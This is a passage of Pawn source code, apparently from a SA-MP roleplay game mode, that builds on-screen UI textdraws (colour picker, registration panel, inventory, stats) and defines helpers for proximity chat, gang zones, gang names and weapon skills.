	TextDrawAlignment(ColorTD[13], 2);
	TextDrawColor(ColorTD[13], -1);
	TextDrawUseBox(ColorTD[13], true);
	TextDrawBoxColor(ColorTD[13], 255);
	TextDrawSetShadow(ColorTD[13], 0);
	TextDrawSetOutline(ColorTD[13], 1);
	TextDrawBackgroundColor(ColorTD[13], 51);
	TextDrawFont(ColorTD[13], 2);
	TextDrawSetProportional(ColorTD[13], 1);
	TextDrawSetSelectable(ColorTD[13], true);

	ColorTD[14] = TextDrawCreate(561.500000, 292.250061, "Type 3");
	TextDrawLetterSize(ColorTD[14], 0.295498, 1.185832);
	TextDrawTextSize(ColorTD[14], 6.000000, 42.583293);
	TextDrawAlignment(ColorTD[14], 2);
	TextDrawColor(ColorTD[14], -1);
	TextDrawUseBox(ColorTD[14], true);
	TextDrawBoxColor(ColorTD[14], 255);
	TextDrawSetShadow(ColorTD[14], 0);
	TextDrawSetOutline(ColorTD[14], 1);
	TextDrawBackgroundColor(ColorTD[14], 51);
	TextDrawFont(ColorTD[14], 2);
	TextDrawSetProportional(ColorTD[14], 1);
	TextDrawSetSelectable(ColorTD[14], true);

	ColorTD[15] = TextDrawCreate(517.000000, 318.500091, "Apply");
	TextDrawLetterSize(ColorTD[15], 0.317499, 1.296666);
	TextDrawTextSize(ColorTD[15], 10.500000, 43.166648);
	TextDrawAlignment(ColorTD[15], 2);
	TextDrawColor(ColorTD[15], -1);
	TextDrawUseBox(ColorTD[15], true);
	TextDrawBoxColor(ColorTD[15], 255);
	TextDrawSetShadow(ColorTD[15], 0);
	TextDrawSetOutline(ColorTD[15], 1);
	TextDrawBackgroundColor(ColorTD[15], 51);
	TextDrawFont(ColorTD[15], 2);
	TextDrawSetProportional(ColorTD[15], 1);
	TextDrawSetSelectable(ColorTD[15], true);

	ColorTD[16] = TextDrawCreate(496.500000, 271.249938, "(           )");
	TextDrawLetterSize(ColorTD[16], 0.295998, 1.518334);
	TextDrawAlignment(ColorTD[16], 1);
	TextDrawColor(ColorTD[16], 1941040639);
	TextDrawSetShadow(ColorTD[16], 0);
	TextDrawSetOutline(ColorTD[16], 1);
	TextDrawBackgroundColor(ColorTD[16], 51);
	TextDrawFont(ColorTD[16], 3);
	TextDrawSetProportional(ColorTD[16], 1);

	ColorTD[17] = TextDrawCreate(537.500000, 270.083221, "(           )");
	TextDrawLetterSize(ColorTD[17], 0.350998, 1.763334);
	TextDrawAlignment(ColorTD[17], 1);
	TextDrawColor(ColorTD[17], 1941040639);
	TextDrawSetShadow(ColorTD[17], 0);
	TextDrawSetOutline(ColorTD[17], 1);
	TextDrawBackgroundColor(ColorTD[17], 51);
	TextDrawFont(ColorTD[17], 3);
	TextDrawSetProportional(ColorTD[17], 1);

	ColorTD[18] = TextDrawCreate(587.000000, 270.083129, "(           )");
	TextDrawLetterSize(ColorTD[18], 0.370997, 1.792497);
	TextDrawAlignment(ColorTD[18], 1);
	TextDrawColor(ColorTD[18], 1941040639);
	TextDrawSetShadow(ColorTD[18], 0);
	TextDrawSetOutline(ColorTD[18], 1);
	TextDrawBackgroundColor(ColorTD[18], 51);
	TextDrawFont(ColorTD[18], 3);
	TextDrawSetProportional(ColorTD[18], 1);

	ColorTD[19] = TextDrawCreate(537.000000, 288.749755, "(           )");
	TextDrawLetterSize(ColorTD[19], 0.362996, 1.786666);
	TextDrawAlignment(ColorTD[19], 1);
	TextDrawColor(ColorTD[19], 1941040639);
	TextDrawSetShadow(ColorTD[19], 0);
	TextDrawSetOutline(ColorTD[19], 1);
	TextDrawBackgroundColor(ColorTD[19], 51);
	TextDrawFont(ColorTD[19], 3);
	TextDrawSetProportional(ColorTD[19], 1);

	Textdraw0 = TextDrawCreate(320.800048, 339.733337, "RIGHT");
	TextDrawLetterSize(Textdraw0, 0.501999, 1.592533);
	TextDrawTextSize(Textdraw0, 372.000030, 13.386665);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 8388863);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 1);
	TextDrawSetProportional(Textdraw0, 1);
	TextDrawSetSelectable(Textdraw0, 1);
    Dallee[0] = Textdraw0;

	Textdraw0 = TextDrawCreate(272.000152, 339.733245, "LEFT");
	TextDrawLetterSize(Textdraw0, 0.449999, 1.600000);
	TextDrawTextSize(Textdraw0, 308.000030, 13.839992);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 8388863);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 1);
	TextDrawSetProportional(Textdraw0, 1);
	TextDrawSetSelectable(Textdraw0, 1);
    Dallee[1] = Textdraw0;

    Textdraw0 = TextDrawCreate(287.200103, 367.360015, "CHOICE");
	TextDrawLetterSize(Textdraw0, 0.449999, 1.600000);
	TextDrawTextSize(Textdraw0, 345.599945, 13.693333);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -5963521);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 1);
	TextDrawSetProportional(Textdraw0, 1);
	TextDrawSetSelectable(Textdraw0, 1);
    Dallee[2] = Textdraw0;

    Textdraw0 = TextDrawCreate(300.000030, 392.746643, "EXIT");
	TextDrawLetterSize(Textdraw0, 0.449999, 1.600000);
	TextDrawTextSize(Textdraw0, 334.399902, 13.960000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1523963137);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 1);
	TextDrawSetProportional(Textdraw0, 1);
	TextDrawSetSelectable(Textdraw0, 1);
    Dallee[3] = Textdraw0;

    Textdraw0 = TextDrawCreate(40.000000, 193.000000, "_");
    TextDrawAlignment(Textdraw0, 2);
    TextDrawBackgroundColor(Textdraw0, 0xCD5C5CFF);
    TextDrawFont(Textdraw0, 5);
    TextDrawLetterSize(Textdraw0, -0.099999, -0.400000);
    TextDrawColor(Textdraw0, -1);
    TextDrawSetOutline(Textdraw0, 0);
    TextDrawSetProportional(Textdraw0, 0);
    TextDrawSetShadow(Textdraw0, 1);
    TextDrawUseBox(Textdraw0, 1);
    TextDrawBoxColor(Textdraw0, 255);
    TextDrawTextSize(Textdraw0, 52.000000, 75.000000);
    TextDrawSetPreviewModel(Textdraw0, 0);
    TextDrawSetPreviewRot(Textdraw0, 0.000000, 0.000000, 0.000000, 1.000000);
    TextDrawSetSelectable(Textdraw0, 1);
    Statistic[s1SkinPlayer] = Textdraw0;

    Textdraw0 = TextDrawCreate(100.000000, 193.000000, "_");
    TextDrawAlignment(Textdraw0, 2);
    TextDrawBackgroundColor(Textdraw0, 0xCD5C5CFF);
    TextDrawFont(Textdraw0, 5);
    TextDrawLetterSize(Textdraw0, -0.099999, -0.400000);
    TextDrawColor(Textdraw0, -1);
    TextDrawSetOutline(Textdraw0, 0);
    TextDrawSetProportional(Textdraw0, 0);
    TextDrawSetShadow(Textdraw0, 1);
    TextDrawUseBox(Textdraw0, 1);
    TextDrawBoxColor(Textdraw0, 255);
    TextDrawTextSize(Textdraw0, 52.000000, 75.000000);
    TextDrawSetPreviewModel(Textdraw0, 0);
    TextDrawSetPreviewRot(Textdraw0, 0.000000, 0.000000, 0.000000, 1.000000);
    TextDrawSetSelectable(Textdraw0, 1);
    Statistic[SkinPlayer1] = Textdraw0;

    Textdraw0 = TextDrawCreate(160.000000, 193.000000, "_");
    TextDrawAlignment(Textdraw0, 2);
    TextDrawBackgroundColor(Textdraw0, 0xCD5C5CFF);
    TextDrawFont(Textdraw0, 5);
    TextDrawLetterSize(Textdraw0, -0.099999, -0.400000);
    TextDrawColor(Textdraw0, -1);
    TextDrawSetOutline(Textdraw0, 0);
    TextDrawSetProportional(Textdraw0, 0);
    TextDrawSetShadow(Textdraw0, 1);
    TextDrawUseBox(Textdraw0, 1);
    TextDrawBoxColor(Textdraw0, 255);
    TextDrawTextSize(Textdraw0, 52.000000, 75.000000);
    TextDrawSetPreviewModel(Textdraw0, 0);
    TextDrawSetPreviewRot(Textdraw0, 0.000000, 0.000000, 0.000000, 1.000000);
    TextDrawSetSelectable(Textdraw0, 1);
    Statistic[SkinPlayer2] = Textdraw0;

    Textdraw0 = TextDrawCreate(40.000000, 283.000000, "_");
    TextDrawAlignment(Textdraw0, 2);
    TextDrawBackgroundColor(Textdraw0, 0xCD5C5CFF);
    TextDrawFont(Textdraw0, 5);
    TextDrawLetterSize(Textdraw0, -0.099999, -0.400000);
    TextDrawColor(Textdraw0, -1);
    TextDrawSetOutline(Textdraw0, 0);
    TextDrawSetProportional(Textdraw0, 0);
    TextDrawSetShadow(Textdraw0, 1);
    TextDrawUseBox(Textdraw0, 1);
    TextDrawBoxColor(Textdraw0, 255);
    TextDrawTextSize(Textdraw0, 52.000000, 75.000000);
    TextDrawSetPreviewModel(Textdraw0, 0);
    TextDrawSetPreviewRot(Textdraw0, 0.000000, 0.000000, 0.000000, 1.000000);
    TextDrawSetSelectable(Textdraw0, 1);
    Statistic[SkinPlayer3] = Textdraw0;

    Textdraw0 = TextDrawCreate(100.000000, 283.000000, "_");
    TextDrawAlignment(Textdraw0, 2);
    TextDrawBackgroundColor(Textdraw0, 0xCD5C5CFF);
    TextDrawFont(Textdraw0, 5);
    TextDrawLetterSize(Textdraw0, -0.099999, -0.400000);
    TextDrawColor(Textdraw0, -1);
    TextDrawSetOutline(Textdraw0, 0);
    TextDrawSetProportional(Textdraw0, 0);
    TextDrawSetShadow(Textdraw0, 1);
    TextDrawUseBox(Textdraw0, 1);
    TextDrawBoxColor(Textdraw0, 255);
    TextDrawTextSize(Textdraw0, 52.000000, 75.000000);
    TextDrawSetPreviewModel(Textdraw0, 0);
    TextDrawSetPreviewRot(Textdraw0, 0.000000, 0.000000, 0.000000, 1.000000);
    TextDrawSetSelectable(Textdraw0, 1);
    Statistic[SkinPlayer4] = Textdraw0;

    Textdraw0 = TextDrawCreate(160.000000, 283.000000, "_");
    TextDrawAlignment(Textdraw0, 2);
    TextDrawBackgroundColor(Textdraw0, 0xCD5C5CFF);
    TextDrawFont(Textdraw0, 5);
    TextDrawLetterSize(Textdraw0, -0.099999, -0.400000);
    TextDrawColor(Textdraw0, -1);
    TextDrawSetOutline(Textdraw0, 0);
    TextDrawSetProportional(Textdraw0, 0);
    TextDrawSetShadow(Textdraw0, 1);
    TextDrawUseBox(Textdraw0, 1);
    TextDrawBoxColor(Textdraw0, 255);
    TextDrawTextSize(Textdraw0, 52.000000, 75.000000);
    TextDrawSetPreviewModel(Textdraw0, 0);
    TextDrawSetPreviewRot(Textdraw0, 0.000000, 0.000000, 0.000000, 1.000000);
    TextDrawSetSelectable(Textdraw0, 1);
    Statistic[SkinPlayer5] = Textdraw0;

    Textdraw0 = TextDrawCreate(227.000000, 147.916656, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 25.931016);
	TextDrawTextSize(Textdraw0, 24.250000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 102);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinPlayer6] = Textdraw0;

	Textdraw0 = TextDrawCreate(18.272062, 137.666687, "Registration Panel");
	TextDrawLetterSize(Textdraw0, 0.332219, 1.751666);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1061109505);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 2);
	TextDrawSetProportional(Textdraw0, 1);
	Statistic[SkinPlayer7] = Textdraw0;

	Textdraw0 = TextDrawCreate(208.147094, 369.833374, "LD_CHAT:thumbup");
	TextDrawLetterSize(Textdraw0, 0.000000, 0.000000);
	TextDrawTextSize(Textdraw0, 32.897071, 26.250017);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 4);
	TextDrawSetSelectable(Textdraw0, 1);
	Statistic[SkinPlayer8] = Textdraw0;

	Textdraw0 = TextDrawCreate(185.411743, 133.000091, "LD_CHAT:thumbdn");
	TextDrawLetterSize(Textdraw0, 0.000000, 0.000000);
	TextDrawTextSize(Textdraw0, 43.294113, 26.833332);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 4);
	TextDrawSetSelectable(Textdraw0, 1);
	Statistic[SkinPlayer9] = Textdraw0;

	Textdraw0 = TextDrawCreate(54.757366, 154.000030, "choice:");
	TextDrawLetterSize(Textdraw0, 0.705998, 2.720001);
	TextDrawTextSize(Textdraw0, 150.588241, 5.833333);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 0);
	TextDrawSetProportional(Textdraw0, 1);
	Statistic[SkinPlayer10] = Textdraw0;

	Textdraw0 = TextDrawCreate(220.750000, 187.583343, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.599071);
	TextDrawTextSize(Textdraw0, 29.875000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 16777215);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinPlayer11] = Textdraw0;

	Textdraw0 = TextDrawCreate(220.125000, 279.166595, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.619902);
	TextDrawTextSize(Textdraw0, 29.250000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 16777215);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinPlayer12] = Textdraw0;

	Textdraw0 = TextDrawCreate(219.500000, 367.833312, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.582868);
	TextDrawTextSize(Textdraw0, 29.250000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 16777215);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinPlayer13] = Textdraw0;

	Textdraw0 = TextDrawCreate(400.000000, 319.000000, "~y~Fight For Business:~n~~r~0 ~w~: ~r~0");
	TextDrawBackgroundColor(Textdraw0, 255);
	TextDrawFont(Textdraw0, 2);
	TextDrawLetterSize(Textdraw0, 0.500000, 1.000000);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 255);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawSetProportional(Textdraw0, 1);
	TextDrawSetShadow(Textdraw0, 1);
	TextdrawMCAPT = Textdraw0;

	Textdraw0 = TextDrawCreate(32.500000, 166.833374, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 11.238891);
	TextDrawTextSize(Textdraw0, 26.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText2] = Textdraw0;

	Textdraw0 = TextDrawCreate(180.625000, 237.416625, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.437041);
	TextDrawTextSize(Textdraw0, 28.625000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][0] = Textdraw0;

    Textdraw0 = TextDrawCreate(182.000000, 166.583328, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 11.227313);
	TextDrawTextSize(Textdraw0, 176.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][1] = Textdraw0;

	Textdraw0 = TextDrawCreate(182.500000, 274.166564, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.504166);
	TextDrawTextSize(Textdraw0, 26.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][2] = Textdraw0;

	Textdraw0 = TextDrawCreate(182.500000, 164.500000, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.499541);
	TextDrawTextSize(Textdraw0, 26.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][3] = Textdraw0;

	Textdraw0 = TextDrawCreate(62.500000, 165.083374, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 11.641670);
	TextDrawTextSize(Textdraw0, 56.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][4] = Textdraw0;

	Textdraw0 = TextDrawCreate(92.000000, 164.249984, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 11.674073);
	TextDrawTextSize(Textdraw0, 86.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][5] = Textdraw0;

	Textdraw0 = TextDrawCreate(122.000000, 164.833328, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 11.616205);
	TextDrawTextSize(Textdraw0, 116.750000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][6] = Textdraw0;

	Textdraw0 = TextDrawCreate(151.375000, 164.249969, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 11.674073);
	TextDrawTextSize(Textdraw0, 147.375000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	Statistic[SkinText3][7] = Textdraw0;

 	Textdraw0 = TextDrawCreate(293.750000, 144.083343, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, 17.257406);
	TextDrawTextSize(Textdraw0, 15.500000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, 102);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
	TextdrawStats = Textdraw0;

	Textdraw0 = TextDrawCreate(20.000000, 132.999969, "Inventory");
	TextDrawLetterSize(Textdraw0, 0.616249, 1.909166);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 1);
	TextDrawSetProportional(Textdraw0, 1);
    Statistic[SkinPlayer] = Textdraw0;

 	Textdraw0 = TextDrawCreate(5.000000, 284.666503, "LD_CHAT:badchat");
	TextDrawLetterSize(Textdraw0, 0.000000, 0.000000);
	TextDrawTextSize(Textdraw0, 43.750000, 30.333374);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 4);
	TextDrawSetSelectable(Textdraw0, 1);
    Statistic[SkinUpdate] = Textdraw0;

 	Textdraw0 = TextDrawCreate(180.625000, 200.666671, "usebox");
	TextDrawLetterSize(Textdraw0, 0.000000, -0.427777);
	TextDrawTextSize(Textdraw0, 28.625000, 0.000000);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, 0);
	TextDrawUseBox(Textdraw0, true);
	TextDrawBoxColor(Textdraw0, -1378294017);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 0);
    Statistic[SkinEatText] = Textdraw0;

	Textdraw0 = TextDrawCreate(189.375000, 162.749954, "Health:~n~~n~Armour:~n~~n~Hunger:~n~~n~Stamina:~n~~n~Power:");
	TextDrawLetterSize(Textdraw0, 0.349374, 1.249999);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 1);
	TextDrawBackgroundColor(Textdraw0, 51);
	TextDrawFont(Textdraw0, 1);
	TextDrawSetProportional(Textdraw0, 1);
    Statistic[SkinWeapon] = Textdraw0;

	Textdraw0 = TextDrawCreate(259.375000, 130.083328, "LD_CHAT:thumbdn");
	TextDrawLetterSize(Textdraw0, 0.000000, 0.000000);
	TextDrawTextSize(Textdraw0, 31.875000, 24.499986);
	TextDrawAlignment(Textdraw0, 1);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetShadow(Textdraw0, 0);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawFont(Textdraw0, 4);
	TextDrawSetSelectable(Textdraw0, 1);
	Statistic[SkinExit] = Textdraw0;

	Textdraw0 = TextDrawCreate(0.000000, 0.000000, "Back");
	TextDrawBackgroundColor(Textdraw0, 255);
	TextDrawFont(Textdraw0, 1);
	TextDrawLetterSize(Textdraw0, 640.000000, 480.000000);
	TextDrawColor(Textdraw0, -1);
	TextDrawSetOutline(Textdraw0, 0);
	TextDrawSetProportional(Textdraw0, 1);
	TextDrawSetShadow(Textdraw0, 1);
	TextDrawUseBox(Textdraw0, 1);
	TextDrawBoxColor(Textdraw0, 255);
	TextDrawTextSize(Textdraw0, 640.000000, 480.000000);
	TextDrawSetSelectable(Textdraw0, 0);
	gInterfaceElement[C_ELEMENT_BACKGROUND] = Textdraw0;
	return true;
}
stock PlayerSpeed(playerid)
{
    new Float:X, Float:Y, Float:Z;
    if(!IsPlayerInAnyVehicle(playerid)) GetPlayerVelocity(playerid,X,Y,Z);
    return floatround( floatsqroot( X * X + Y * Y + Z * Z ) * 170.0 );
}
stock CheckBunnyHop(playerid) {
    if(GetTickCount() - GetPVarInt(playerid, "UnBannyHop") < 4000) {
        if(PlayerSpeed(playerid) >= 18 && PlayerSpeed(playerid) < 50) ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,0,0,0 );
    }
    SetPVarInt(playerid, "UnBannyHop", GetTickCount());
}
stock ShowSTODialog(playerid) {
    ShowPlayerDialog(playerid,dStoRAK,DIALOG_STYLE_LIST,"{"#cGREEN"}Avtosaxelosno: {ffffff}TuneList","1. Avtomobilis Shegebva [500$]\n2. Avtomobilis Remonti [100$]\n3. Diskebis Shecvla [1000$]","Archeva","Daxurva");
}
stock ProxDetector(playerid, string[], color)
{
    if(IsIP(string) || CheckString(string)) return Proverka(playerid, string);
    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
     	if(IsPlayerConnected(i))
      	{
       		new Float:rdist,Float:distance = 13.0;
         	rdist = GetPlayerDistanceToPlayer(playerid,i);
          	if(rdist > distance || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
          	SendClientMessage(i, color, string);
       	}
	}
    return true;
}
IsNotDriving(carid)
{
	switch(GetVehicleModel(carid))
	{
		case 481, 462, 448, 530, 509, 510, 571: return true;
	}
 	return false;
}
stock SetPlayerSkills(playerid)
{
	SetPlayerSkillLevel(playerid,WEAPONSKILL_PISTOL,			pData[playerid][pPistol_Skill]/10);
	SetPlayerSkillLevel(playerid,WEAPONSKILL_DESERT_EAGLE,		pData[playerid][pEagle_Skill]/10);
	SetPlayerSkillLevel(playerid,WEAPONSKILL_SHOTGUN,			pData[playerid][pShotGun_Skill]/10);
	SetPlayerSkillLevel(playerid,WEAPONSKILL_MP5,				pData[playerid][pMP5_Skill]/10);
	SetPlayerSkillLevel(playerid,WEAPONSKILL_AK47,				pData[playerid][pAK47_Skill]/10);
	SetPlayerSkillLevel(playerid,WEAPONSKILL_M4,				pData[playerid][pM4_Skill]/10);
	SetPlayerSkillLevel(playerid,WEAPONSKILL_SNIPERRIFLE,		pData[playerid][pSniper_Skill]/10);
	return true;
}
stock SaveGZ(idx)
{
	new gzmes[128];
	format(gzmes, sizeof(gzmes), "UPDATE `gangzone` SET `fraction` = '%d' WHERE `id` = '%d'", GZInfo[idx-1][gFrakVlad], idx);
	mysql_empty(mysql, gzmes);
	return true;
}
stock GetGZColorF(fnumber)
{
	new zx;
	switch(fnumber)
	{
		case F_GROVE: zx = 0xFF0000AA;
		case F_BALLAS: zx = 0xFF0000AA;
		case F_RIFA: zx = 0xFF0000AA;
		case F_AZTEC: zx = 0xFF0000AA;
		case F_VAGOS: zx = 0xFF0000AA;
		case 0: zx = 0xFF0000AA;
	}
	return zx;
}
stock GetGangZoneColor(gangzonex)
{
	new zx;
	switch(GZInfo[gangzonex][gFrakVlad])
	{
		case F_GROVE: zx = 0x006600AA;
		case F_BALLAS: zx = 0x8823AAAA;
		case F_RIFA: zx = 0x4444AAAA;
		case F_AZTEC: zx = 0x00EBFFAA;
		case F_VAGOS: zx = 0xDEBC34AA;
		default: zx = 0xFEFEFEAA;
	}
	return zx;
}
stock IsAGang(playerid)
{
	new member = pData[playerid][pFraction];
	switch(member)
	{
		case F_GROVE, F_BALLAS, F_RIFA, F_AZTEC, F_VAGOS: return true;
	}
	return false;
}
stock IsInAllowedF(fnumbers)
{
	for(new i =0;i<sizeof(allowedfactions);i++)
	{
		if(fnumbers == allowedfactions[i]) return true;
	}
	return false;
}
stock IsInAllowed(playerid)
{
	new L = sizeof(allowedfactions);
	for(new i =0;i<L;i++)
	{
		if(pData[playerid][pFraction] == allowedfactions[i]) return true;
	}
	return false;
}
stock PlayerToKvadrat(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
	new Float:xxp,Float:yyp,Float:zzp;
	GetPlayerPos(playerid, xxp, yyp, zzp);
	if((xxp <= max_x && xxp >= min_x) && (yyp <= max_y && yyp >= min_y)) return true;
	return false;
}
stock GetMafiaName(fnumbwer)
{
	new string[15];
	switch(fnumbwer)
	{
		case 12: format(string,sizeof(string),"Yakuza");
		case 13: format(string,sizeof(string),"LCN");
		case 14: format(string,sizeof(string),"RM");
	}
	return string;
}
stock GetGangName(fnumbwer)
{
	new string[15];
	switch(fnumbwer)
	{
		case F_GROVE: format(string,sizeof(string),"Grove Street");
